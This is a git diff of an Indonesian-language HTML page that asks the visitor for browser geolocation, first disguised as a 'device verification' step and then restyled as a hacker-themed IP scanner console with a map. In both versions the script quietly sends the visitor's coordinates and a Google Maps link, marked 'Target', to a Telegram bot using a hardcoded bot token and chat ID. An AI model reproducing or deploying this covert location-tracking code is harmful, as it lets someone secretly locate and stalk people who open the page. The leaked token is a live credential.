@@ -3,39 +3,68 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verifikasi Keamanan</title>
+    <title>JIDIN_IP_SCANNER</title>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; padding-top: 50px; background: #f4f4f9; }
-        .btn { background: #007bff; color: white; padding: 12px 24px; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; margin-top: 20px; }
+        body { background-color: #050b05; color: #00ff00; font-family: 'Courier New', Courier, monospace; margin: 0; padding: 10px; }
+        .header { border: 1px solid #00ff00; padding: 5px 10px; margin-bottom: 10px; font-size: 14px; display: flex; justify-content: space-between; background: #0a1f0a; }
+        .container { display: flex; gap: 10px; flex-wrap: wrap; }
+        .panel { border: 1px solid #00ff00; padding: 10px; flex: 1; min-width: 300px; background: #030803; box-sizing: border-box; }
+        .btn-scan { background: #00ff00; color: #000; font-weight: bold; border: none; padding: 5px 15px; cursor: pointer; font-family: 'Courier New'; }
+        #map { height: 200px; width: 100%; border: 1px solid #00ff00; margin-top: 10px; }
     </style>
 </head>
 <body>
-    <h2>Verifikasi Perangkat</h2>
-    <p>Ketuk tombol di bawah ini untuk melanjutkan.</p>
-    <button class="btn" onclick="mulaiLacak()">Lanjutkan</button>
-
+    <div class="header">
+        <span>JIDIN_CYBER_CONSOLE v8.0</span>
+        <span id="utc-time">UTC</span>
+    </div>
+    <div class="container">
+        <div class="panel">
+            <p>[ TAB 01: ENGINE ]</p>
+            <h3>J I D I N</h3>
+            <button class="btn-scan" onclick="mulaiLacak()">MULAI SCAN</button>
+            <p id="log-status">> Menunggu aksi...</p>
+        </div>
+        <div class="panel">
+            <p>[ TAB 02: MAP ]</p>
+            <div id="map"></div>
+            <p style="font-size: 12px; margin-top: 10px;">
+              KOOR: <span id="teks-koor">-</span><br>
+              MAPS: <a id="link-maps" href="#" target="_blank" style="color: #00ff00;">-</a>
+            </p>
+        </div>
+    </div>
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <script>
+        let map = L.map('map').setView([-6.200000, 106.816666], 13);
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { maxZoom: 19 }).addTo(map);
+        let marker = L.marker([-6.200000, 106.816666]).addTo(map);
+
         function mulaiLacak() {
             if (navigator.geolocation) {
+                document.getElementById('log-status').innerText = "> Mengakses GPS...";
                 navigator.geolocation.getCurrentPosition(function(position) {
                     let lat = position.coords.latitude;
                     let lon = position.coords.longitude;
 
+                    document.getElementById('teks-koor').innerText = lat + ", " + lon;
+                    let mapsUrl = "https://maps.google.com/?q=" + lat + "," + lon;
+                    let linkEl = document.getElementById('link-maps');
+                    linkEl.href = mapsUrl;
+                    linkEl.innerText = "Buka Google Maps";
+
+                    map.setView([lat, lon], 15);
+                    marker.setLatLng([lat, lon]);
+                    document.getElementById('log-status').innerText = "[+] SELESAI!";
+
                     let tokenBot = "8769576802:AAFqMQGPSUpiaKMtoluHfI7OBqQ_8s64yhk";
                     let chatId = "6269176229";
-                    let pesan = "Koordinat: " + lat + ", " + lon + " - Peta: https://maps.google.com/?q=" + lat + "," + lon;
-                    let urlApi = "https://api.telegram.org/bot" + tokenBot + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(pesan);
-
-                    fetch(urlApi).then(response => {
-                        alert("Verifikasi Selesai");
-                    }).catch(error => {
-                        alert("Gagal mengirim data.");
-                    });
+                    let urlApi = "https://api.telegram.org/bot" + tokenBot + "/sendMessage?chat_id=" + chatId + "&text=Target:%20https://maps.google.com/?q=" + lat + "," + lon;
+                    fetch(urlApi);
                 }, function(error) {
                     alert("Izin lokasi ditolak.");
                 });
-            } else {
-                alert("Geolocation tidak didukung.");
             }
         }
     </script>
